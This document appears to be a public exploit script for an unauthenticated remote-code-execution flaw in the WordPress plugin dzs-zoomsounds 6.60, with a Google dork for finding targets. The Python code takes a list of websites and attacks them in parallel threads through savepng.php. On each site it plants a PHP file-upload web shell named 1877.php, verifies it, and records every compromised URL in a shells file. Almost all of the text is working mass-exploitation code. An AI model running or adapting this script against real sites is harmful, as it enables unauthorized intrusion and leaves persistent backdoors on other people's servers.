# Exploit Title: WordPress Plugin dzs-zoomsounds - Remote Code Execution (RCE) (Unauthenticated)
# Google Dork: inurl:wp-content/plugins/dzs-zoomsounds
# Date: 16/02/2022
# Exploit Author: Overthinker1877 (1877 Team)
# Vendor Homepage: https://digitalzoomstudio.net/docs/wpzoomsounds/
# Version: 6.60
# Tested on: Windows / Linux

import os
import requests
import threading
from multiprocessing.dummy import Pool,Lock
from bs4 import BeautifulSoup
import time
import smtplib,sys,ctypes
from random import choice
from colorama import Fore
from colorama import Style
from colorama import init
import re
import time
from time import sleep
init(autoreset=True)
fr = Fore.RED
gr = Fore.BLUE
fc = Fore.CYAN
fw = Fore.WHITE
fy = Fore.YELLOW
fg = Fore.GREEN
sd = Style.DIM
sn = Style.NORMAL
sb = Style.BRIGHT
Bad = 0
Good = 0
def Folder(directory):
  if not os.path.exists(directory):
    os.makedirs(directory)
Folder("exploited")
def clear():
    try:
        if os.name == 'nt':
            os.system('cls')
        else:
            os.system('clear')
    except:
        pass
def finder(i) :
    global Bad,Good
    head = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/85.0.4183.102 Safari/537.36'}
    try :
            x = requests.session()
            listaa = ['/wp-content/plugins/dzs-zoomsounds/savepng.php?location=1877.php']
            for script in listaa :
                url = (i+"/"+script)
                while True :
                    req_first = x.get(url, headers=head)
                    if "error:http raw post data does not exist" in req_first.text :
                        burp0_headers = {"User-Agent": "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_10_1) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/39.0.2171.95 Safari/537.36", "Accept-Encoding": "gzip, deflate", "Accept": "*/*", "Connection": "close"}
                        burp0_data = "<?php\r\nerror_reporting(0);\r\necho(base64_decode(\"T3ZlcnRoaW5rZXIxODc3Ijxmb3JtIG1ldGhvZD0nUE9TVCcgZW5jdHlwZT0nbXVsdGlwYXJ0L2Zvcm0tZGF0YSc+PGlucHV0IHR5cGU9J2ZpbGUnbmFtZT0nZicgLz48aW5wdXQgdHlwZT0nc3VibWl0JyB2YWx1ZT0ndXAnIC8+PC9mb3JtPiI=\"));\r\n@copy($_FILES['f']['tmp_name'],$_FILES['f']['name']);\r\necho(\"<a href=\".$_FILES['f']['name'].\">\".$_FILES['f']['name'].\"</a>\");\r\n?>"
                        requests.post(url, headers=burp0_headers, data=burp0_data,timeout=45)
                        urlx = (i+"/"+"/wp-content/plugins/dzs-zoomsounds/1877.php")
                        req_second = x.get(urlx, headers=head)
                        if "Overthinker1877" in req_second.text :
                            Good = Good + 1
                            print(fg+"Exploited "+fw+">> "+fg+" = "+urlx)
                            with open("exploited/shell.txt","a") as file :
                                file.write(urlx+"\n")
                                file.close()
                        else :
                            Bad = Bad + 1
                            print(fc+""+fw+"["+fr+"X"+fw+"] "+fr+" "+i+" "+fw+" <<< "+fr+" Can't Exploit")
                    else :
                        Bad = Bad + 1
                        print(fc+""+fw+"["+fr+"X"+fw+"] "+fr+" "+i+" "+fw+" <<< "+fr+" Not Vuln")

                        pass
                    break
    except :
        pass
    if os.name == 'nt':
        ctypes.windll.kernel32.SetConsoleTitleW('1877Exploit | Exploited-{} | Not Vuln-{}'.format(Good, Bad))
    else :
        sys.stdout.write('\x1b]2; 1877Exploit | Exploited-{} | Not Vuln-{}\x07'.format(Good,Bad))

def key_logo():
    clear = '\x1b[0m'
    colors = [36, 32, 34, 35, 31, 37]
    x = '          [ + ] OVERTHINKER1877 EXPLOIT'
    for N, line in enumerate(x.split('\n')):
        sys.stdout.write('\x1b[1;%dm%s%s\n' % (choice(colors), line, clear))
        time.sleep(0.05)

def process(line):
    time.sleep(1)


def run() :
    key_logo()
    clear()
    print("""  
      [-] -----------------------------------------[-]
      [+]             WwW.1877.TeaM
      [-] -----------------------------------------[-]
                          \n \n""")
    file_name = input("Website List : ")
    op = open(file_name,'r').read().splitlines()
    TEXTList = [list.strip() for list in op]
    p = Pool(int(input('Thread : ')))
    p.map(finder, TEXTList)

run()